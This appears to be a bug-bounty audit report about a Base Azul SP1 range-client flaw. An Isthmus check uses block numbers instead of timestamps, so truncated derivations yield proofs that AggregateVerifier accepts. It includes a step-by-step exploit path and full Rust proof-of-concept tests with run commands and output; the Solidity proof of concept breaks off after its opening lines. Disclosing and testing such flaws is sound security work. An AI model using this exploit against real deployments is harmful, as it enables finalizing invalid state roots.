# 75423 sc medium zk range client accepts truncated post azul execution allowing invalid aggregateverifier state roots

**Submitted on Apr 29th 2026 at 03:01:08 UTC by @Brainiac5 for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #75423
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/base/contracts/tree/v8.1.0/src/multiproof>
* **Impacts:**
  * Forging or bypassing TEE or ZK proof verification in AggregateVerifier to finalize an invalid state root on L1

## Description

## Brief

The SP1 range client handles `EndOfSource` incorrectly after Isthmus/Azul. It checks fork activation using an L2 block number where the rollup config expects an L2 timestamp. Because Base Sepolia block numbers are much smaller than fork timestamps, the post-Azul proof client treats a missing data source as if it were allowed pre-Isthmus truncation. A prover can therefore stop derivation early, still commit the requested later L2 block number in public values, and produce an aggregation journal that `AggregateVerifier` accepts for a full proposal/challenge window.

**Asset/location:**

* Blockchain/DLT: `https://github.com/base/base/tree/v0.8.0-rc.28`
* Smart Contract impact surface: `contracts/src/multiproof/AggregateVerifier.sol`

## Vulnerability Details

In `base-rc28/crates/succinct/utils/client/src/client.rs`, `advance_to_target()` handles `PipelineError::EndOfSource` like this:

```rust
if target.is_some() {
    target = Some(tip_cursor.l2_safe_head.block_info.number);
};

if cfg.is_isthmus_active(driver.cursor.read().l2_safe_head().block_info.number) {
    return Err(PipelineError::EndOfSource.crit().into());
}
continue;
```

`RollupConfig::is_isthmus_active()` expects a timestamp, not a block number. On Base Sepolia after Azul, the safe-head timestamp is after Isthmus, but the L2 block number is still around `40_000_000`, far below the Isthmus timestamp. The guard returns false and the client continues instead of rejecting the truncated proof.

The next issue is that the witness executor only checks the output root, not that derivation reached the requested block:

```rust
if output_root != boot.claimed_l2_output_root {
    return Err(anyhow!(...));
}
```

Then `BootInfoStruct::new()` commits the requested `boot.claimed_l2_block_number`, not the returned safe-head block number:

```rust
l2PostRoot: boot_info.claimed_l2_output_root,
l2BlockNumber: boot_info.claimed_l2_block_number,
```

So if a malicious prover derives only to block `N + 20`, sets `claimed_l2_output_root = root(N + 20)`, and sets `claimed_l2_block_number = N + 600`, the range proof public values can claim a 600-block transition while only executing 20 blocks.

This becomes exploitable against `AggregateVerifier` because the range program’s `intermediate_root_interval` is prover input and is not separately bound to the onchain interval. Sepolia uses:

```
BLOCK_INTERVAL=600
INTERMEDIATE_BLOCK_INTERVAL=30
PROOF_THRESHOLD=1
```

So the contract expects 20 intermediate roots for a 600-block proposal. A malicious prover can run the range program with `intermediate_root_interval = 1`, derive only the first 20 blocks, and produce exactly 20 intermediate roots. The byte shape matches what `AggregateVerifier` expects, but the roots correspond to blocks `N+1..N+20`, not `N+30..N+600`.

The aggregation program then commits those roots into the same packed journal shape used by `AggregateVerifier`:

```solidity
keccak256(
    abi.encodePacked(
        proposer,
        l1OriginHash,
        startingRoot,
        startingL2SequenceNumber,
        endingRoot,
        endingL2SequenceNumber,
        intermediateRoots,
        CONFIG_HASH,
        ZK_RANGE_HASH
    )
)
```

`AggregateVerifier` has no way to tell that the 20 roots came from one-block spacing instead of 30-block spacing, because the ZK public values do not bind the interval used inside the range client.

## Impact Details

This allows an invalid ZK proposal for game type `621`:

1. Start from a valid anchor root at block `N`.
2. Derive only the first 20 L2 blocks.
3. Stop the preimage/data source after block `N + 20`.
4. The buggy `EndOfSource` branch accepts the truncation even though Base Sepolia is post-Azul.
5. The proof commits:
   * `l2PreBlockNumber = N`
   * `l2BlockNumber = N + 600`
   * `l2PostRoot = root(N + 20)`
   * `intermediateRoots = root(N+1)..root(N+20)`
6. The aggregation digest equals the journal that `AggregateVerifier` verifies for a 600-block proposal.
7. Because Sepolia activation uses `PROOF_THRESHOLD=1`, a single accepted ZK proof is enough for the game to resolve `DEFENDER_WINS` after the finalization delay.

The resulting root is invalid for the claimed L2 sequence number. It is a real canonical root for an earlier block, but it is being accepted as the root for a later block. That breaks the binding between L2 sequence number and output root, which is the exact binding the ZK proof is supposed to enforce.

This does not require:

* TEE compromise.
* Guardian/admin inaction for the proof to be accepted.
* RPC/admin port exposure.
* A trusted signer mistake.

Manual blacklisting or a later counter-proof may be possible operational mitigation, but the vulnerability is that the proof system accepts the invalid proof in the first place.

## Why This Is In Scope

This is in the `base/base` v0.8.0-rc.28 ZK proof code and affects the smart-contract verifier path in `AggregateVerifier`.

The impact is not an operational RPC exposure or a trusted-admin action. The proof program itself accepts an incomplete derivation and produces public values that match the onchain verifier journal for a longer transition than was executed.

## Suggested Fix

* In `advance_to_target()`, call `cfg.is_isthmus_active()` with the safe-head timestamp, not the safe-head block number.
* In proof mode, do not lower a requested target after `EndOfSource`; return an error when a target was requested and the pipeline cannot reach it.
* After `advance_to_target()`, assert `safe_head.block_info.number == boot.claimed_l2_block_number`.
* Include the effective `intermediate_root_interval` or expected root spacing/count in the committed public values and onchain journal.
* In the aggregation program, reject range proofs whose `intermediateRoots.len()` does not match `(l2BlockNumber - l2PreBlockNumber) / expected_interval`.

## References

* `base-rc28/crates/succinct/utils/client/src/client.rs:95`
* `base-rc28/crates/succinct/utils/client/src/client.rs:100`
* `base-rc28/crates/succinct/utils/client/src/client.rs:106`
* `base-rc28/crates/succinct/utils/client/src/witness/executor.rs:158`
* `base-rc28/crates/succinct/utils/client/src/witness/executor.rs:172`
* `base-rc28/crates/succinct/utils/client/src/boot.rs:45`
* `base-rc28/crates/succinct/utils/client/src/boot.rs:47`
* `base-rc28/crates/succinct/programs/aggregation/src/main.rs:80`
* `base-rc28/crates/succinct/programs/aggregation/src/main.rs:102`
* `contracts/src/multiproof/AggregateVerifier.sol:511`
* `contracts/src/multiproof/AggregateVerifier.sol:917`
* `contracts/src/multiproof/AggregateVerifier.sol:932`
* `contracts/test/multiproof/AuditZkEndOfSourceTruncation.t.sol:52`
* `contracts/test/multiproof/AuditZkEndOfSourceTruncation.t.sol:67`
* `contracts/test/multiproof/AuditZkEndOfSourceTruncation.t.sol:92`
* `contracts/test/multiproof/AuditZkEndOfSourceTruncation.t.sol:107`
* `contract-deployments/sepolia/2026-04-20-activate-multiproof/.env:14`
* `contract-deployments/sepolia/2026-04-20-activate-multiproof/.env:15`
* `contract-deployments/sepolia/2026-04-20-activate-multiproof/.env:16`

## Confidence

Confirmed locally with runnable Rust and Foundry PoCs. The Rust PoC proves the root cause, truncated execution, incorrect public values, and exact journal match. The Foundry PoC proves that this journal is sufficient for `AggregateVerifier` to resolve `DEFENDER_WINS` and become claim-valid on L1.

## Proof of Concept

There are two PoCs:

* A Rust PoC proving the ZK range/aggregation public-value bug.
* A Foundry PoC proving the resulting journal is enough for `AggregateVerifier` to create, resolve, and accept a 600-block game whose root came from only the first 20 blocks.

### PoC 1 - ZK Client And Journal Construction

PoC worktree:

```
/Users/shealtielanz/bounty/base-azul/base-rc28
```

PoC file:

```
crates/succinct/utils/client/tests/audit_end_of_source_guard.rs
```

I added the `base-protocol` `test-utils` feature in this local PoC so the test can build encoded L1-info deposit transactions. The only required dependency change for PoC 1 is this line in `base-rc28/crates/succinct/utils/client/Cargo.toml`:

```toml
base-protocol = { workspace = true, features = ["test-utils"] }
```

Run:

```sh
cd /Users/shealtielanz/bounty/base-azul/base-rc28
cargo test --locked -p base-succinct-client-utils --test audit_end_of_source_guard --config 'target.aarch64-apple-darwin.rustflags=["-C","link-arg=-fuse-ld=ld"]'
```

Observed result:

```
running 3 tests
test audit_end_of_source_guard_uses_block_number_instead_of_timestamp ... ok
test audit_truncated_one_block_range_can_commit_full_challenge_window ... ok
test audit_truncated_twenty_block_range_can_commit_sepolia_600_block_proposal ... ok

test result: ok. 3 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out
```

The most important test is `audit_truncated_twenty_block_range_can_commit_sepolia_600_block_proposal`.

It proves:

* Base Sepolia is post-Isthmus by timestamp.
* The buggy guard checks the block number and treats the same safe head as pre-Isthmus.
* The client derives only 20 blocks.
* The public values still commit `l2BlockNumber = start + 600`.
* The 20 one-block roots have the exact byte length expected by Sepolia `AggregateVerifier`.
* The aggregation digest equals the packed journal that `AggregateVerifier` verifies for the 600-block proposal.

<details>

<summary>Full PoC 1 source</summary>

```rust
//! Audit PoC: the SP1 range client checks Isthmus activation with an L2 block number.
//!
//! `RollupConfig::is_isthmus_active` expects an L2 timestamp. The range client's
//! `EndOfSource` branch passes `l2_safe_head.block_info.number`, so Base Sepolia
//! after Azul is treated as pre-Isthmus and the client accepts a truncated range.

use std::{
    convert::Infallible,
    future::Future,
    iter::FusedIterator,
    pin::Pin,
    task::{Context, Poll, RawWaker, RawWakerVTable, Waker},
};

use alloy_eips::{BlockNumHash, eip2718::Encodable2718};
use alloy_consensus::{Header, Sealed};
use alloy_genesis::ChainConfig;
use alloy_primitives::{Address, B256, Bytes, Sealed as PrimitiveSealed, keccak256};
use alloy_sol_types::SolValue;
use async_trait::async_trait;
use base_common_consensus::{BaseTxEnvelope, TxDeposit};
use base_common_rpc_types_engine::BasePayloadAttributes;
use base_consensus_derive::{
    OriginProvider, Pipeline, PipelineError, PipelineErrorKind, PipelineResult, Signal,
    SignalReceiver, StepResult,
};
use base_consensus_genesis::{RollupConfig, SystemConfig};
use base_consensus_registry::Registry;
use base_proof::BootInfo;
use base_proof_executor::BlockBuildingOutcome;
use base_proof_driver::{Driver, DriverPipeline, Executor, PipelineCursor, TipCursor};
use base_protocol::{AttributesWithParent, BlockInfo, L2BlockInfo, test_utils::RAW_BEDROCK_INFO_TX};
use base_succinct_client_utils::{boot::BootInfoStruct, types::AggregationOutputs};
use spin::RwLock;

#[derive(Debug)]
struct EndOfSourcePipeline {
    cfg: RollupConfig,
    origin: BlockInfo,
}

impl Iterator for EndOfSourcePipeline {
    type Item = AttributesWithParent;

    fn next(&mut self) -> Option<Self::Item> {
        None
    }
}

impl FusedIterator for EndOfSourcePipeline {}

impl OriginProvider for EndOfSourcePipeline {
    fn origin(&self) -> Option<BlockInfo> {
        Some(self.origin)
    }
}

#[async_trait]
impl Pipeline for EndOfSourcePipeline {
    fn peek(&self) -> Option<&AttributesWithParent> {
        None
    }

    async fn step(&mut self, _cursor: L2BlockInfo) -> StepResult {
        StepResult::StepFailed(PipelineErrorKind::Critical(PipelineError::EndOfSource))
    }

    fn rollup_config(&self) -> &RollupConfig {
        &self.cfg
    }

    async fn system_config_by_number(
        &mut self,
        _number: u64,
    ) -> Result<SystemConfig, PipelineErrorKind> {
        unreachable!("no payload is produced in this PoC")
    }
}

#[async_trait]
impl SignalReceiver for EndOfSourcePipeline {
    async fn signal(&mut self, _signal: Signal) -> PipelineResult<()> {
        Ok(())
    }
}

impl DriverPipeline<EndOfSourcePipeline> for EndOfSourcePipeline {
    fn flush(&mut self) {}
}

#[derive(Debug)]
struct UnusedExecutor;

#[async_trait]
impl Executor for UnusedExecutor {
    type Error = Infallible;

    async fn wait_until_ready(&mut self) {}

    fn update_safe_head(&mut self, _header: Sealed<Header>) {}

    async fn execute_payload(
        &mut self,
        _attributes: base_common_rpc_types_engine::BasePayloadAttributes,
    ) -> Result<base_proof_executor::BlockBuildingOutcome, Self::Error> {
        unreachable!("EndOfSource returns before execution")
    }

    fn compute_output_root(&mut self) -> Result<B256, Self::Error> {
        unreachable!("EndOfSource returns before execution")
    }
}

#[derive(Debug)]
struct OnePayloadThenEndPipeline {
    cfg: RollupConfig,
    origin: BlockInfo,
    prepared: Option<AttributesWithParent>,
    produced_once: bool,
}

impl Iterator for OnePayloadThenEndPipeline {
    type Item = AttributesWithParent;

    fn next(&mut self) -> Option<Self::Item> {
        self.prepared.take()
    }
}

impl FusedIterator for OnePayloadThenEndPipeline {}

impl OriginProvider for OnePayloadThenEndPipeline {
    fn origin(&self) -> Option<BlockInfo> {
        Some(self.origin)
    }
}

#[async_trait]
impl Pipeline for OnePayloadThenEndPipeline {
    fn peek(&self) -> Option<&AttributesWithParent> {
        self.prepared.as_ref()
    }

    async fn step(&mut self, cursor: L2BlockInfo) -> StepResult {
        if self.produced_once {
            return StepResult::StepFailed(PipelineErrorKind::Critical(PipelineError::EndOfSource));
        }

        self.produced_once = true;
        let mut attributes = BasePayloadAttributes::default();
        attributes.payload_attributes.timestamp = cursor.block_info.timestamp + self.cfg.block_time;
        self.prepared =
            Some(AttributesWithParent::new(attributes, cursor, Some(self.origin), true));
        StepResult::PreparedAttributes
    }

    fn rollup_config(&self) -> &RollupConfig {
        &self.cfg
    }

    async fn system_config_by_number(
        &mut self,
        _number: u64,
    ) -> Result<SystemConfig, PipelineErrorKind> {
        unreachable!("the audit pipeline returns a prepared payload directly")
    }
}

#[async_trait]
impl SignalReceiver for OnePayloadThenEndPipeline {
    async fn signal(&mut self, _signal: Signal) -> PipelineResult<()> {
        Ok(())
    }
}

impl DriverPipeline<OnePayloadThenEndPipeline> for OnePayloadThenEndPipeline {
    fn flush(&mut self) {}
}

#[derive(Debug)]
struct ScriptedPayloadsThenEndPipeline {
    cfg: RollupConfig,
    origin: BlockInfo,
    prepared: Option<AttributesWithParent>,
    produced: usize,
    blocks_to_produce: usize,
}

impl Iterator for ScriptedPayloadsThenEndPipeline {
    type Item = AttributesWithParent;

    fn next(&mut self) -> Option<Self::Item> {
        self.prepared.take()
    }
}

impl FusedIterator for ScriptedPayloadsThenEndPipeline {}

impl OriginProvider for ScriptedPayloadsThenEndPipeline {
    fn origin(&self) -> Option<BlockInfo> {
        Some(self.origin)
    }
}

#[async_trait]
impl Pipeline for ScriptedPayloadsThenEndPipeline {
    fn peek(&self) -> Option<&AttributesWithParent> {
        self.prepared.as_ref()
    }

    async fn step(&mut self, cursor: L2BlockInfo) -> StepResult {
        if self.produced >= self.blocks_to_produce {
            return StepResult::StepFailed(PipelineErrorKind::Critical(PipelineError::EndOfSource));
        }

        self.produced += 1;
        let mut attributes = BasePayloadAttributes::default();
        attributes.payload_attributes.timestamp = cursor.block_info.timestamp + self.cfg.block_time;
        attributes.transactions = Some(vec![encoded_l1_info_deposit()]);
        self.prepared =
            Some(AttributesWithParent::new(attributes, cursor, Some(self.origin), true));
        StepResult::PreparedAttributes
    }

    fn rollup_config(&self) -> &RollupConfig {
        &self.cfg
    }

    async fn system_config_by_number(
        &mut self,
        _number: u64,
    ) -> Result<SystemConfig, PipelineErrorKind> {
        unreachable!("the audit pipeline returns prepared payloads directly")
    }
}

#[async_trait]
impl SignalReceiver for ScriptedPayloadsThenEndPipeline {
    async fn signal(&mut self, _signal: Signal) -> PipelineResult<()> {
        Ok(())
    }
}

impl DriverPipeline<ScriptedPayloadsThenEndPipeline> for ScriptedPayloadsThenEndPipeline {
    fn flush(&mut self) {}
}

#[derive(Debug)]
struct OneBlockExecutor {
    header: Sealed<Header>,
    output_root: B256,
}

#[async_trait]
impl Executor for OneBlockExecutor {
    type Error = Infallible;

    async fn wait_until_ready(&mut self) {}

    fn update_safe_head(&mut self, _header: Sealed<Header>) {}

    async fn execute_payload(
        &mut self,
        _attributes: BasePayloadAttributes,
    ) -> Result<BlockBuildingOutcome, Self::Error> {
        Ok((self.header.clone(), Default::default()).into())
    }

    fn compute_output_root(&mut self) -> Result<B256, Self::Error> {
        Ok(self.output_root)
    }
}

#[derive(Debug)]
struct ScriptedExecutor {
    headers: Vec<Sealed<Header>>,
    roots: Vec<B256>,
    next_index: usize,
    last_index: usize,
}

#[async_trait]
impl Executor for ScriptedExecutor {
    type Error = Infallible;

    async fn wait_until_ready(&mut self) {}

    fn update_safe_head(&mut self, _header: Sealed<Header>) {}

    async fn execute_payload(
        &mut self,
        _attributes: BasePayloadAttributes,
    ) -> Result<BlockBuildingOutcome, Self::Error> {
        self.last_index = self.next_index;
        let header = self.headers[self.next_index].clone();
        self.next_index += 1;
        Ok((header, Default::default()).into())
    }

    fn compute_output_root(&mut self) -> Result<B256, Self::Error> {
        Ok(self.roots[self.last_index])
    }
}

fn encoded_l1_info_deposit() -> Bytes {
    let tx = BaseTxEnvelope::Deposit(PrimitiveSealed::new(TxDeposit {
        input: Bytes::from(&RAW_BEDROCK_INFO_TX),
        ..Default::default()
    }));
    let mut out = Vec::new();
    tx.encode_2718(&mut out);
    Bytes::from(out)
}

fn b256_from_u64(value: u64) -> B256 {
    let mut bytes = [0u8; 32];
    bytes[24..].copy_from_slice(&value.to_be_bytes());
    B256::from(bytes)
}

fn noop_waker() -> Waker {
    unsafe fn clone(_: *const ()) -> RawWaker {
        RawWaker::new(std::ptr::null(), &VTABLE)
    }
    unsafe fn wake(_: *const ()) {}
    unsafe fn wake_by_ref(_: *const ()) {}
    unsafe fn drop(_: *const ()) {}

    static VTABLE: RawWakerVTable = RawWakerVTable::new(clone, wake, wake_by_ref, drop);
    // SAFETY: The vtable functions ignore the null data pointer and never dereference it.
    unsafe { Waker::from_raw(RawWaker::new(std::ptr::null(), &VTABLE)) }
}

fn block_on_ready<F: Future>(future: F) -> F::Output {
    let waker = noop_waker();
    let mut cx = Context::from_waker(&waker);
    let mut future = Box::pin(future);
    match Pin::new(&mut future).poll(&mut cx) {
        Poll::Ready(output) => output,
        Poll::Pending => panic!("audit PoC future unexpectedly yielded"),
    }
}

fn seeded_driver(
    cfg: RollupConfig,
    safe_number: u64,
    safe_timestamp: u64,
    safe_root: B256,
) -> Driver<UnusedExecutor, EndOfSourcePipeline, EndOfSourcePipeline> {
    let origin = BlockInfo::new(B256::repeat_byte(0x01), 1, B256::ZERO, safe_timestamp);
    let safe_info = L2BlockInfo {
        block_info: BlockInfo::new(
            B256::repeat_byte(0x22),
            safe_number,
            B256::repeat_byte(0x21),
            safe_timestamp,
        ),
        l1_origin: origin.id(),
        seq_num: 0,
    };
    let safe_header = Sealed::new_unchecked(
        Header { number: safe_number, timestamp: safe_timestamp, ..Default::default() },
        safe_info.block_info.hash,
    );

    let mut cursor = PipelineCursor::new(cfg.channel_timeout(safe_timestamp), origin);
    cursor.advance(origin, TipCursor::new(safe_info, safe_header, safe_root));

    Driver::new(
        std::sync::Arc::new(RwLock::new(cursor)),
        UnusedExecutor,
        EndOfSourcePipeline { cfg, origin },
    )
}

fn seeded_one_block_driver(
    mut cfg: RollupConfig,
    safe_number: u64,
    safe_timestamp: u64,
    safe_root: B256,
    one_block_root: B256,
) -> Driver<OneBlockExecutor, OnePayloadThenEndPipeline, OnePayloadThenEndPipeline> {
    let origin = BlockInfo::new(B256::repeat_byte(0x01), 1, B256::ZERO, safe_timestamp);
    let safe_info = L2BlockInfo {
        block_info: BlockInfo::new(
            B256::repeat_byte(0x22),
            safe_number,
            B256::repeat_byte(0x21),
            safe_timestamp,
        ),
        l1_origin: origin.id(),
        seq_num: 0,
    };
    let safe_header = Sealed::new_unchecked(
        Header { number: safe_number, timestamp: safe_timestamp, ..Default::default() },
        safe_info.block_info.hash,
    );
    let one_block_header = Header {
        number: safe_number + 1,
        parent_hash: safe_info.block_info.hash,
        timestamp: safe_timestamp + cfg.block_time,
        state_root: B256::repeat_byte(0x55),
        ..Default::default()
    };
    let one_block_hash = one_block_header.hash_slow();
    let one_block_header = Sealed::new_unchecked(one_block_header, one_block_hash);

    // Avoid needing a real encoded L1-info deposit in this focused driver test. The driver
    // accepts an empty transaction list for the configured genesis L2 block.
    cfg.genesis.l2 = BlockNumHash { number: safe_number + 1, hash: one_block_hash };

    let mut cursor = PipelineCursor::new(cfg.channel_timeout(safe_timestamp), origin);
    cursor.advance(origin, TipCursor::new(safe_info, safe_header, safe_root));

    Driver::new(
        std::sync::Arc::new(RwLock::new(cursor)),
        OneBlockExecutor { header: one_block_header, output_root: one_block_root },
        OnePayloadThenEndPipeline { cfg, origin, prepared: None, produced_once: false },
    )
}

fn seeded_scripted_driver(
    cfg: RollupConfig,
    safe_number: u64,
    safe_timestamp: u64,
    safe_root: B256,
    blocks_to_produce: usize,
) -> (
    Driver<ScriptedExecutor, ScriptedPayloadsThenEndPipeline, ScriptedPayloadsThenEndPipeline>,
    Vec<B256>,
) {
    let origin = BlockInfo::new(B256::repeat_byte(0x01), 1, B256::ZERO, safe_timestamp);
    let safe_info = L2BlockInfo {
        block_info: BlockInfo::new(
            B256::repeat_byte(0x22),
            safe_number,
            B256::repeat_byte(0x21),
            safe_timestamp,
        ),
        l1_origin: origin.id(),
        seq_num: 0,
    };
    let safe_header = Sealed::new_unchecked(
        Header { number: safe_number, timestamp: safe_timestamp, ..Default::default() },
        safe_info.block_info.hash,
    );

    let mut parent_hash = safe_info.block_info.hash;
    let mut headers = Vec::with_capacity(blocks_to_produce);
    let mut roots = Vec::with_capacity(blocks_to_produce);
    for offset in 1..=blocks_to_produce {
        let number = safe_number + offset as u64;
        let header = Header {
            number,
            parent_hash,
            timestamp: safe_timestamp + cfg.block_time * offset as u64,
            state_root: b256_from_u64(number),
            ..Default::default()
        };
        let hash = header.hash_slow();
        parent_hash = hash;
        headers.push(Sealed::new_unchecked(header, hash));
        roots.push(b256_from_u64(0xA000 + offset as u64));
    }

    let mut cursor = PipelineCursor::new(cfg.channel_timeout(safe_timestamp), origin);
    cursor.advance(origin, TipCursor::new(safe_info, safe_header, safe_root));

    (
        Driver::new(
            std::sync::Arc::new(RwLock::new(cursor)),
            ScriptedExecutor { headers, roots: roots.clone(), next_index: 0, last_index: 0 },
            ScriptedPayloadsThenEndPipeline {
                cfg,
                origin,
                prepared: None,
                produced: 0,
                blocks_to_produce,
            },
        ),
        roots,
    )
}

#[test]
fn audit_end_of_source_guard_uses_block_number_instead_of_timestamp() {
    let cfg = Registry::rollup_config(84532).expect("Base Sepolia config exists").clone();
    let isthmus_timestamp =
        cfg.hardforks.isthmus_time.expect("Base Sepolia Isthmus timestamp exists");
    let safe_timestamp = isthmus_timestamp + 600;
    let safe_number = 40_308_263;
    let safe_root = B256::repeat_byte(0xAA);
    let target_number = safe_number + 30;

    assert!(
        cfg.is_isthmus_active(safe_timestamp),
        "the safe head timestamp is after Isthmus/Azul"
    );
    assert!(
        !cfg.is_isthmus_active(safe_number),
        "the buggy guard passes an L2 block number, which is treated as pre-Isthmus"
    );

    let mut driver = seeded_driver(cfg.clone(), safe_number, safe_timestamp, safe_root);

    let (returned_head, returned_root, intermediate_roots) = block_on_ready(
        base_succinct_client_utils::client::advance_to_target(
            &mut driver,
            &cfg,
            Some(target_number),
            10,
        )
    )
    .expect("buggy guard accepts EndOfSource instead of rejecting it");

    assert_eq!(returned_head.block_info.number, safe_number);
    assert_eq!(returned_root, safe_root);
    assert!(
        intermediate_roots.is_empty(),
        "no blocks were derived even though the requested target is later"
    );

    let public_values = BootInfoStruct::new(
        BootInfo {
            l1_head: B256::repeat_byte(0x11),
            agreed_l2_output_root: safe_root,
            claimed_l2_output_root: returned_root,
            claimed_l2_block_number: target_number,
            chain_id: 84532,
            rollup_config: cfg,
            l1_config: ChainConfig::default(),
            proposer: Address::repeat_byte(0x44),
            intermediate_block_interval: 10,
            l1_head_number: 1,
        },
        safe_number,
        intermediate_roots,
    );

    assert_eq!(public_values.l2PreBlockNumber, safe_number);
    assert_eq!(
        public_values.l2BlockNumber, target_number,
        "the committed public values still claim the later target block"
    );
    assert_eq!(public_values.l2PostRoot, safe_root);
    assert_ne!(
        returned_head.block_info.number, public_values.l2BlockNumber,
        "the client derived only to the safe head but would commit the requested target"
    );
}

#[test]
fn audit_truncated_one_block_range_can_commit_full_challenge_window() {
    let cfg = Registry::rollup_config(84532).expect("Base Sepolia config exists").clone();
    let isthmus_timestamp =
        cfg.hardforks.isthmus_time.expect("Base Sepolia Isthmus timestamp exists");
    let safe_timestamp = isthmus_timestamp + 600;
    let safe_number = 40_308_263;
    let target_number = safe_number + 30;
    let safe_root = B256::repeat_byte(0xAA);
    let one_block_root = B256::repeat_byte(0xBB);

    let mut driver =
        seeded_one_block_driver(cfg.clone(), safe_number, safe_timestamp, safe_root, one_block_root);

    let (returned_head, returned_root, intermediate_roots) = block_on_ready(
        base_succinct_client_utils::client::advance_to_target(
            &mut driver,
            &cfg,
            Some(target_number),
            1,
        )
    )
    .expect("buggy guard accepts EndOfSource after only one derived block");

    assert_eq!(returned_head.block_info.number, safe_number + 1);
    assert_eq!(returned_root, one_block_root);
    assert_eq!(
        intermediate_roots,
        vec![one_block_root],
        "a malicious prover-controlled interval of 1 makes the truncated proof shape match a single challenged segment"
    );

    let public_values = BootInfoStruct::new(
        BootInfo {
            l1_head: B256::repeat_byte(0x11),
            agreed_l2_output_root: safe_root,
            claimed_l2_output_root: returned_root,
            claimed_l2_block_number: target_number,
            chain_id: 84532,
            rollup_config: cfg,
            l1_config: ChainConfig::default(),
            proposer: Address::repeat_byte(0x44),
            intermediate_block_interval: 30,
            l1_head_number: 1,
        },
        safe_number,
        intermediate_roots,
    );

    assert_eq!(public_values.l2PreBlockNumber, safe_number);
    assert_eq!(public_values.l2PostRoot, one_block_root);
    assert_eq!(
        public_values.l2BlockNumber, target_number,
        "the public values claim a 30-block segment although only one block was derived"
    );

    let proposer = Address::repeat_byte(0x44);
    let config_hash = public_values.rollupConfigHash;
    let range_vkey = B256::repeat_byte(0x77);
    let aggregate_outputs = AggregationOutputs {
        proverAddress: proposer,
        l1Head: public_values.l1Head,
        l2PreRoot: public_values.l2PreRoot,
        startingL2SequenceNumber: public_values.l2PreBlockNumber,
        l2PostRoot: public_values.l2PostRoot,
        endingL2SequenceNumber: public_values.l2BlockNumber,
        intermediateRoots: public_values.intermediateRoots.clone(),
        rollupConfigHash: config_hash,
        imageHash: range_vkey,
    };

    let aggregate_digest = keccak256(aggregate_outputs.abi_encode_packed());
    let aggregate_verifier_challenge_journal = keccak256(
        [
            proposer.as_slice(),
            public_values.l1Head.as_slice(),
            safe_root.as_slice(),
            &safe_number.to_be_bytes(),
            one_block_root.as_slice(),
            &target_number.to_be_bytes(),
            one_block_root.as_slice(),
            config_hash.as_slice(),
            range_vkey.as_slice(),
        ]
        .concat(),
    );

    assert_eq!(
        aggregate_digest, aggregate_verifier_challenge_journal,
        "the truncated proof commits exactly the journal shape AggregateVerifier.challenge verifies"
    );
}

#[test]
fn audit_truncated_twenty_block_range_can_commit_sepolia_600_block_proposal() {
    let cfg = Registry::rollup_config(84532).expect("Base Sepolia config exists").clone();
    let isthmus_timestamp =
        cfg.hardforks.isthmus_time.expect("Base Sepolia Isthmus timestamp exists");
    let safe_timestamp = isthmus_timestamp + 600;
    let safe_number = 40_308_263;
    let block_interval = 600;
    let intermediate_block_interval = 30;
    let expected_roots = block_interval / intermediate_block_interval;
    let target_number = safe_number + block_interval;
    let safe_root = B256::repeat_byte(0xAA);

    let (mut driver, first_twenty_roots) = seeded_scripted_driver(
        cfg.clone(),
        safe_number,
        safe_timestamp,
        safe_root,
        expected_roots as usize,
    );

    let (returned_head, returned_root, intermediate_roots) = block_on_ready(
        base_succinct_client_utils::client::advance_to_target(
            &mut driver,
            &cfg,
            Some(target_number),
            1,
        )
    )
    .expect("buggy guard accepts EndOfSource after only 20 derived blocks");

    assert_eq!(returned_head.block_info.number, safe_number + expected_roots);
    assert_eq!(returned_root, *first_twenty_roots.last().unwrap());
    assert_eq!(
        intermediate_roots, first_twenty_roots,
        "the proof records 20 one-block roots, the same byte length Sepolia AggregateVerifier expects for 20 thirty-block roots"
    );

    let public_values = BootInfoStruct::new(
        BootInfo {
            l1_head: B256::repeat_byte(0x11),
            agreed_l2_output_root: safe_root,
            claimed_l2_output_root: returned_root,
            claimed_l2_block_number: target_number,
            chain_id: 84532,
            rollup_config: cfg,
            l1_config: ChainConfig::default(),
            proposer: Address::repeat_byte(0x44),
            intermediate_block_interval,
            l1_head_number: 1,
        },
        safe_number,
        intermediate_roots,
    );

    assert_eq!(public_values.l2PreBlockNumber, safe_number);
    assert_eq!(public_values.l2PostRoot, returned_root);
    assert_eq!(
        public_values.l2BlockNumber, target_number,
        "the public values claim the full 600-block Sepolia proposal although only 20 blocks were derived"
    );

    let proposer = Address::repeat_byte(0x44);
    let config_hash = public_values.rollupConfigHash;
    let range_vkey = B256::repeat_byte(0x77);
    let aggregate_outputs = AggregationOutputs {
        proverAddress: proposer,
        l1Head: public_values.l1Head,
        l2PreRoot: public_values.l2PreRoot,
        startingL2SequenceNumber: public_values.l2PreBlockNumber,
        l2PostRoot: public_values.l2PostRoot,
        endingL2SequenceNumber: public_values.l2BlockNumber,
        intermediateRoots: public_values.intermediateRoots.clone(),
        rollupConfigHash: config_hash,
        imageHash: range_vkey,
    };

    let aggregate_digest = keccak256(aggregate_outputs.abi_encode_packed());
    let aggregate_verifier_proposal_journal = keccak256(
        [
            proposer.as_slice(),
            public_values.l1Head.as_slice(),
            safe_root.as_slice(),
            &safe_number.to_be_bytes(),
            returned_root.as_slice(),
            &target_number.to_be_bytes(),
            public_values.intermediateRoots.as_ref(),
            config_hash.as_slice(),
            range_vkey.as_slice(),
        ]
        .concat(),
    );

    assert_eq!(
        aggregate_digest, aggregate_verifier_proposal_journal,
        "the truncated proof commits exactly the journal shape AggregateVerifier verifies for a 600-block proposal"
    );
}
```

</details>

### PoC 2 - AggregateVerifier Accepts The Truncated Journal As A Claim-Valid Game

PoC file:

```
contracts/test/multiproof/AuditZkEndOfSourceTruncation.t.sol
```

Run:

```sh
cd /Users/shealtielanz/bounty/base-azul/contracts
forge test --match-path test/multiproof/AuditZkEndOfSourceTruncation.t.sol -vvv
```

Observed result:

```
Ran 1 test for test/multiproof/AuditZkEndOfSourceTruncation.t.sol:AuditZkEndOfSourceTruncationTest
[PASS] testTruncatedTwentyBlockZkJournalCreatesClaimValidSixHundredBlockGame()
Suite result: ok. 1 passed; 0 failed; 0 skipped
```

This test uses a strict journal-checking verifier instead of a permissive mock verifier. The verifier only returns true when the journal equals the exact journal produced by the truncated 20-block proof path.

<details>

<summary>Full PoC 2 source</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

